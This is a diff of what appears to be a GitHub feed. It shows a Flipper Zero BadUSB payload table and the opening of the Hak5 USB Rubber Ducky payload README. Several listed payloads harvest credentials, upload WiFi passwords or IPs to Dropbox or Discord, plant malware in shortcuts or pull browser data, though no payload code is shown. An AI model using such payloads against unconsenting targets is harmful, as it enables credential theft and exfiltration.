+   &lt;td style=&quot;text-align:left&quot;&gt;RickRoll that plays in the PowerShell console after a mouse movement is detected.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-PineApple&quot;&gt;PineApple&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Connect a target&#39;s PC to your WiFi PineApple.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;⛔&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Play-WAV&quot;&gt;Play-WAV&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Download a WAV file and play it after a mouse movement is detected.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Rage-PopUps&quot;&gt;Rage-Pop-Ups&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Generates an infinite loop of insulting pop-ups.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;⛔&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Subscribe&quot;&gt;Subscribe&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Used to make your target subscribe to your YouTube channel.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-MustSub&quot;&gt;Must Sub&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;A script used to make your target subscribe to 15 of Jakoby&#39;s favorite YouTube channels.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-PS-Draw&quot;&gt;PS-Draw&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;A script used to generate and draw images in the PowerShell window.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;⛔&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Wallpaper-Troll&quot;&gt;WallPaper-Troll&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Collects sensitive info from your target and displays it as their wallpaper to taunt them.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-WallPaper-URL&quot;&gt;WallPaper-URL&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Sets the target&#39;s wallpaper to an image you provide via a URL after a mouse movement is detected.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-We-Found-You&quot;&gt;We-Found-You&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Opens a map with your target&#39;s current location on it.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-YT-Tripwire&quot;&gt;YT-Tripwire&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Opens any YouTube video after a mouse movement is detected.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Credz-Plz&quot;&gt;Credz-Plz&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;A script used to prompt the target to enter their credentials to later be exfiltrated.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-ShortcutJacker&quot;&gt;Shortcut Jacker&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;A script used to embed malware in the shortcut on your target&#39;s desktop.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;⛔&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-WifiGrabber&quot;&gt;Wifi Grabber&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Grabs your target&#39;s WiFi passwords and uploads them to either Dropbox, Discord, or both.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-IP-Grabber&quot;&gt;IP Grabber&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Grabs your target&#39;s IP addresses and uploads them to either Dropbox, Discord, or both.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+  &lt;tr&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;&lt;a href=&quot;https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-BrowserData&quot;&gt;Browser Data&lt;/a&gt;&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;This payload can be used to retrieve the browsing history and bookmarks of your target.&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;✅&lt;/td&gt; 
+   &lt;td style=&quot;text-align:left&quot;&gt;Jakoby&lt;/td&gt; 
+  &lt;/tr&gt; 
+ &lt;/tbody&gt; 
+&lt;/table&gt; 
+&lt;!-- CONTACT --&gt; 
+&lt;h2&gt;Contact&lt;/h2&gt; 
+&lt;h2 align=&quot;center&quot;&gt;📱 My Socials 📱&lt;/h2&gt; 
+&lt;div align=&quot;center&quot;&gt; 
+ &lt;table&gt; 
+  &lt;tbody&gt;
+   &lt;tr&gt; 
+    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://youtube.com/c/IamJakoby?sub_confirmation=1&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/youtube-svgrepo-com.svg?sanitize=true&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;C#&quot; /&gt; &lt;/a&gt; &lt;br /&gt;YouTube &lt;/td&gt; 
+    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://twitter.com/I_Am_Jakoby&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/twitter.png&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;Python&quot; /&gt; &lt;/a&gt; &lt;br /&gt;Twitter &lt;/td&gt; 
+    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://www.instagram.com/i_am_jakoby/&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/insta.png&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;Golang&quot; /&gt; &lt;/a&gt; &lt;br /&gt;Instagram &lt;/td&gt; 
+    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://discord.gg/MYYER2ZcJF&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/discord-v2-svgrepo-com.svg?sanitize=true&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;Jsonnet&quot; /&gt; &lt;/a&gt; &lt;br /&gt;Discord &lt;/td&gt; 
+    &lt;td align=&quot;center&quot; width=&quot;96&quot;&gt; &lt;a href=&quot;https://www.tiktok.com/@i_am_jakoby?lang=en&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg?sanitize=true&quot; width=&quot;48&quot; height=&quot;48&quot; alt=&quot;Jsonnet&quot; /&gt; &lt;/a&gt; &lt;br /&gt;TikTok &lt;/td&gt; 
+   &lt;/tr&gt; 
+  &lt;/tbody&gt;
+ &lt;/table&gt; 
+&lt;/div&gt; 
+&lt;!-- ACKNOWLEDGMENTS --&gt; 
+&lt;h2&gt;Acknowledgments&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://hak5.org/&quot;&gt;Hak5&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://github.com/hak5darren&quot;&gt;Darren&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://github.com/UberGuidoZ&quot;&gt;UberGuidoZ&lt;/a&gt;&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;p align=&quot;right&quot;&gt;(&lt;a href=&quot;https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/#top&quot;&gt;back to top&lt;/a&gt;)&lt;/p&gt;</description>
+      
+      <media:content url="https://repository-images.githubusercontent.com/496055858/bf232f0e-d8ff-4be3-85c3-2fb30da37ae5" medium="image" />
+      
+    </item>
+    
+    <item>
+      <title>hak5/usbrubberducky-payloads</title>
+      <link>https://github.com/hak5/usbrubberducky-payloads</link>
+      <description>&lt;p&gt;The Official USB Rubber Ducky Payload Repository&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Payload Library for the &lt;a href=&quot;https://hak5.org/products/usb-rubber-ducky?variant=39874478932081&quot;&gt;USB Rubber Ducky&lt;/a&gt; by &lt;a href=&quot;https://hak5.org&quot;&gt;Hak5&lt;/a&gt;&lt;/h1&gt; 
+&lt;p&gt;This repository contains payloads, extensions and languages for the Hak5 USB Rubber Ducky. Community developed payloads are listed and developers are encouraged to create pull requests to make changes to or submit new payloads.&lt;/p&gt; 
+&lt;p&gt;&lt;strong&gt;Payloads here are written in official DuckyScript™ specifically for the USB Rubber Ducky. Payloads here must be compiled using Hak5 PayloadStudio. Hak5 does NOT guarantee payload functionality.&lt;/strong&gt; &lt;a href=&quot;https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/#legal&quot;&gt;&lt;b&gt;See Legal and Disclaimers&lt;/b&gt;&lt;/a&gt;&lt;/p&gt; 
+&lt;div align=&quot;center&quot;&gt; 
+ &lt;img src=&quot;https://img.shields.io/github/forks/hak5/usbrubberducky-payloads?style=for-the-badge&quot; /&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 
+ &lt;img src=&quot;https://img.shields.io/github/stars/hak5/usbrubberducky-payloads?style=for-the-badge&quot; /&gt; 
+ &lt;br /&gt; 
+ &lt;img src=&quot;https://img.shields.io/github/commit-activity/y/hak5/usbrubberducky-payloads?style=for-the-badge&quot; /&gt; 
+ &lt;img src=&quot;https://img.shields.io/github/contributors/hak5/usbrubberducky-payloads?style=for-the-badge&quot; /&gt; 
+&lt;/div&gt; 
+&lt;br /&gt; 
+&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://payloadhub.com&quot;&gt;&lt;img src=&quot;https://cdn.shopify.com/s/files/1/0068/2142/files/payloadhub.png?v=1652474600&quot; /&gt;&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://hak5.org/blogs/payloads/tagged/usb-rubber-ducky&quot;&gt;View Featured Ducky Payloads and Leaderboard&lt;/a&gt; &lt;br /&gt;&lt;i&gt;Get your payload in front of thousands. Enter to win over $2,000 in prizes in the &lt;a href=&quot;https://hak5.org/pages/payload-awards&quot;&gt;Hak5 Payload Awards!&lt;/a&gt;&lt;/i&gt; &lt;/p&gt; 
+&lt;div align=&quot;center&quot;&gt; 
+ &lt;a href=&quot;https://hak5.org/discord&quot;&gt;&lt;img src=&quot;https://img.shields.io/discord/506629366659153951?label=Hak5%20Discord&amp;amp;style=for-the-badge&quot; /&gt;&lt;/a&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 
+ &lt;a href=&quot;https://youtube.com/hak5&quot;&gt;&lt;img src=&quot;https://img.shields.io/youtube/channel/views/UC3s0BtrBJpwNDaflRSoiieQ?label=YouTube%20Views&amp;amp;style=for-the-badge&quot; /&gt;&lt;/a&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 
+ &lt;a href=&quot;https://youtube.com/hak5&quot;&gt;&lt;img src=&quot;https://img.shields.io/youtube/channel/subscribers/UC3s0BtrBJpwNDaflRSoiieQ?style=for-the-badge&quot; /&gt;&lt;/a&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 
+ &lt;a href=&quot;https://twitter.com/hak5&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/follow-%40hak5-1DA1F2?logo=twitter&amp;amp;style=for-the-badge&quot; /&gt;&lt;/a&gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 
+ &lt;a href=&quot;https://instagram.com/hak5gear&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Instagram-E4405F?style=for-the-badge&amp;amp;logo=instagram&amp;amp;logoColor=white&quot; /&gt;&lt;/a&gt; 
+ &lt;br /&gt;
+ &lt;br /&gt; 
+&lt;/div&gt; 
+&lt;h1&gt;Table of contents&lt;/h1&gt; 
+&lt;details open&gt; 
+ &lt;ul&gt; 
+  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/#about-the-new-usb-rubber-ducky&quot;&gt;About the USB Rubber Ducky&lt;/a&gt;&lt;/li&gt; 
+  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/#build-your-payloads-with-payloadstudio&quot;&gt;PayloadStudio (Editor + Compiler)&lt;/a&gt;&lt;/li&gt; 
+  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/#about-duckyscript&quot;&gt;About DuckyScript™&lt;/a&gt;&lt;/li&gt; 
+  &lt;li&gt;&lt;b&gt;&lt;a href=&quot;https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/#contributing&quot;&gt;Contributing Payloads&lt;/a&gt;&lt;/b&gt;&lt;/li&gt; 
+  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/#legal&quot;&gt;&lt;b&gt;Legal and Disclaimers&lt;/b&gt;&lt;/a&gt;&lt;/li&gt; 
+ &lt;/ul&gt; 
+&lt;/details&gt; 
+&lt;h2&gt;Shop&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://hak5.org/products/usb-rubber-ducky?variant=39874478932081&quot; title=&quot;Purchase the NEW USB Rubber Ducky&quot;&gt;NEW USB Rubber Ducky&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://hak5.org/products/payload-studio-pro&quot; title=&quot;Purchase PayloadStudio Pro&quot;&gt;PayloadStudio Pro&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://shop.hak5.org&quot; title=&quot;Shop All Hak5 Tools&quot;&gt;Shop All Hak5 Tools&lt;/a&gt;&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;Getting Started&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/#build-your-payloads-with-payloadstudio&quot;&gt;Build and Encode Payloads with PayloadStudio&lt;/a&gt; | &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/unboxing-quack-start-guide&quot; title=&quot;QUICK START GUIDE&quot;&gt;QUICK START GUIDE&lt;/a&gt; | &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/ducky-script-basics/hello-world&quot;&gt;Your First Payload&lt;/a&gt;&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;Documentation / Learn More&lt;/h2&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/&quot; title=&quot;Documentation&quot;&gt;Documentation&lt;/a&gt; | &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/ducky-script-quick-reference&quot; title=&quot;Quick Reference Guide&quot;&gt;Quick Reference Guide&lt;/a&gt;&lt;/li&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://shop.hak5.org/collections/usb-rubber-ducky-essentials/products/advanced-duckyscript-course&quot; title=&quot;DuckyScript Online Course&quot;&gt;Advanced DuckyScript Online Course&lt;/a&gt; | &lt;a href=&quot;https://shop.hak5.org/collections/usb-rubber-ducky-essentials/products/usb-rubber-ducky-textbook&quot; title=&quot;Textbook&quot;&gt;Textbook&lt;/a&gt;&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;Community&lt;/h2&gt; 
+&lt;p&gt;&lt;em&gt;Got Questions? Need some help? Reach out:&lt;/em&gt;&lt;/p&gt; 
+&lt;ul&gt; 
+ &lt;li&gt;&lt;a href=&quot;https://hak5.org/discord/&quot; title=&quot;Discord&quot;&gt;Discord&lt;/a&gt; | &lt;a href=&quot;https://forums.hak5.org/forum/111-new-usb-rubber-ducky/&quot; title=&quot;Forums&quot;&gt;Forums&lt;/a&gt;&lt;/li&gt; 
+&lt;/ul&gt; 
+&lt;h2&gt;Additional Links&lt;/h2&gt; 
+&lt;p&gt;&lt;b&gt; Follow the creators &lt;/b&gt;&lt;br /&gt;&lt;/p&gt; 
+&lt;p&gt; &lt;b&gt;Korben&#39;s Socials&lt;/b&gt;&lt;br /&gt; &lt;a href=&quot;https://twitter.com/notkorben&quot;&gt;&lt;img src=&quot;https://img.shields.io/twitter/follow/notkorben?style=social&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://instagram.com/hak5korben&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Instagram-Follow%20@hak5korben-E1306C&quot; /&gt;&lt;/a&gt; &lt;br /&gt; &lt;b&gt;Darren&#39;s Socials&lt;/b&gt;&lt;br /&gt; &lt;a href=&quot;https://twitter.com/hak5darren&quot;&gt;&lt;img src=&quot;https://img.shields.io/twitter/follow/hak5darren?style=social&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://instagram.com/hak5darren&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/Instagram-Follow%20@hak5darren-E1306C&quot; /&gt;&lt;/a&gt; &lt;/p&gt; 
+&lt;br /&gt; 
+&lt;h1&gt;&lt;a href=&quot;https://hak5.org/products/usb-rubber-ducky&quot;&gt;About the NEW USB Rubber Ducky&lt;/a&gt;&lt;/h1&gt; 
+&lt;p&gt;A &quot;flash drive&quot; that types keystroke injection payloads into unsuspecting devices at incredible speeds.&lt;/p&gt; 
+&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
+&lt;div align=&quot;center&quot;&gt;
+ &lt;b&gt; &lt;br /&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=meNlOrdQJFo&quot;&gt;Launch Video&lt;/a&gt; | &lt;a href=&quot;https://shop.hak5.org/pages/keystroke-reflection&quot;&gt;Introducing Keystroke Reflection&lt;/a&gt; | &lt;a href=&quot;https://www.youtube.com/watch?v=hFfo1TdY9hU&quot;&gt;Introducing OS Detection&lt;/a&gt; &lt;br /&gt;&lt;br /&gt;&lt;p&gt;&lt;/p&gt; &lt;/b&gt;
+&lt;/div&gt; 
+&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=meNlOrdQJFo&quot;&gt;&lt;img src=&quot;https://3076592524-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MiIkRK_o3RBhZzUkrzr%2Fuploads%2FCiHTAeL8jlCA3mG7ltCF%2FScreencast%20from%2003-03-2023%2001_08_58%20PM.gif?alt=media&quot; /&gt;&lt;/a&gt; &lt;br /&gt; &lt;i&gt;New USB Rubber Ducky (A+C, DuckyScript 3.0, 2022)&lt;/i&gt; &lt;/p&gt; 
+&lt;p&gt;Computers trust humans. Humans use keyboards. Hence the universal spec — HID, or Human Interface Device.&lt;/p&gt; 
+&lt;p&gt;A keyboard presents itself as a HID, and in turn it&#39;s inherently trusted as human by the computer.&lt;/p&gt; 
+&lt;p&gt;The USB Rubber Ducky — which looks like an innocent flash drive to humans — takes advantage of this trust to deliver powerful payloads, injecting keystrokes at superhuman speeds.&lt;/p&gt; 
+&lt;p&gt;Easily automate any task you can perform with a keyboard with an easy to learn language designed specifically for the USB Rubber Ducky.&lt;/p&gt; 
+&lt;h1&gt;About DuckyScript™&lt;/h1&gt; 
+&lt;h2&gt;Legacy DuckyScript (1.0)&lt;/h2&gt; 
+&lt;p&gt;Hak5 introduced Keystroke Injection in 2010 with the USB Rubber Ducky™. This technique, developed by Hak5 founder Darren Kitchen, was his weapon of choice for automating mundane tasks at his IT job — fixing printers, network shares and the like. Today the USB Rubber Ducky is a hacker culture icon, synonymous with the keystroke injection technique it pioneered. It’s found its way into the hearts and toolkits of Cybersecurity and IT pros the world over — including many movies and TV shows! Core to its success is its simple language, DuckyScript™. Originally just three commands, it could be learned by anyone—regardless of experience—in minutes.&lt;/p&gt; 
+&lt;p&gt;&lt;b&gt; With the new USB Rubber Ducky in 2022, DuckyScript 3.0 has been introduced.&lt;/b&gt;&lt;/p&gt; 
+&lt;h2&gt;DuckyScript 3.0&lt;/h2&gt; 
+&lt;p&gt;DuckyScript 3.0 is a feature rich, structured programming language. It includes all of the previously available commands and features of the original DuckyScript.&lt;/p&gt; 
+&lt;p&gt;&lt;b&gt;(DuckyScript 3.0 is backwards compatible with DuckyScript 1.0; this means all your favorite DuckyScript 1.0 payloads are valid DuckyScript 3.0) &lt;/b&gt;&lt;/p&gt; 
+&lt;p&gt;Additionally, DuckyScript 3.0 introduces &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/conditional-statements&quot; title=&quot;View Documentation&quot;&gt;control flow constructs&lt;/a&gt;, &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/loops&quot; title=&quot;View Documentation&quot;&gt;loops&lt;/a&gt;, &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/functions&quot; title=&quot;View Documentation&quot;&gt;functions&lt;/a&gt;, &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/extensions&quot; title=&quot;View Documentation&quot;&gt;extensions&lt;/a&gt;. Plus, DuckyScript 3.0 includes many features specific to &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection&quot; title=&quot;View Documentation&quot;&gt;keystroke injection&lt;/a&gt; attack/automation, such as &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes&quot; title=&quot;View Documentation&quot;&gt;HID &amp;amp; Storage attack modes&lt;/a&gt;, OS Detection, &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration#the-keystroke-reflection-attack&quot; title=&quot;View Documentation&quot;&gt;Keystroke Reflection&lt;/a&gt; (&lt;a href=&quot;https://shop.hak5.org/pages/keystroke-reflection&quot; title=&quot;Keystroke Reflection Video + Whitepaper&quot;&gt;Video + Whitepaper&lt;/a&gt;), &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/jitter&quot; title=&quot;View Documentation&quot;&gt;jitter&lt;/a&gt; and &lt;a href=&quot;https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/randomization&quot; title=&quot;View Documentation&quot;&gt;randomization&lt;/a&gt; to name a few.&lt;/p&gt; 
+&lt;p&gt;While many of the Hak5 Tools run various versions of DuckyScript; unlike the &lt;a href=&quot;https://shop.hak5.org/products/bash-bunny&quot;&gt;Bash Bunny&lt;/a&gt;, &lt;a href=&quot;https://shop.hak5.org/products/key-croc&quot;&gt;Key Croc&lt;/a&gt; and even the &lt;a href=&quot;https://shop.hak5.org/collections/mischief-gadgets/&quot; title=&quot;O.MG&quot;&gt;officially licenced DuckyScript compatible devices from O.MG&lt;/a&gt; - which use &lt;code&gt;INTERPRETED&lt;/code&gt; versions of DuckyScript - the USB Rubber Ducky uses &lt;code&gt;COMPILED inject.bin&lt;/code&gt; payloads.&lt;/p&gt; 
+&lt;p&gt;&lt;em&gt;Interpreted DuckyScript means the payload runs straight from &lt;code&gt;source code&lt;/code&gt; (the code you write e.g. &lt;code&gt;DELAY 1000&lt;/code&gt;).&lt;/em&gt;&lt;/p&gt; 
+&lt;p&gt;&lt;em&gt;Compiled DuckyScript means that there is both &lt;code&gt;source code&lt;/code&gt; and an &lt;code&gt;inject.bin&lt;/code&gt; generated from the source code. (DuckyScript 1.0 was &quot;encoded&quot; rather than &quot;compiled&quot; - references to either mean the same)&lt;/em&gt;&lt;/p&gt; 
+&lt;p&gt;The files in this repository are &lt;em&gt;the source code&lt;/em&gt; in the form of &lt;code&gt;payload.txt&lt;/code&gt; files.&lt;/p&gt; 
+&lt;h1&gt;&lt;a href=&quot;https://shop.hak5.org/collections/usb-rubber-ducky-accessories/products/advanced-duckyscript-course&quot;&gt;Learn DuckyScript directly from the creators&lt;/a&gt;&lt;/h1&gt; 
+&lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://shop.hak5.org/collections/usb-rubber-ducky-accessories/products/advanced-duckyscript-course&quot;&gt;&lt;img width=&quot;500px&quot; src=&quot;https://cdn.shopify.com/s/files/1/0068/2142/products/online-course-icon_2000x.png&quot; /&gt;&lt;/a&gt; &lt;/p&gt;
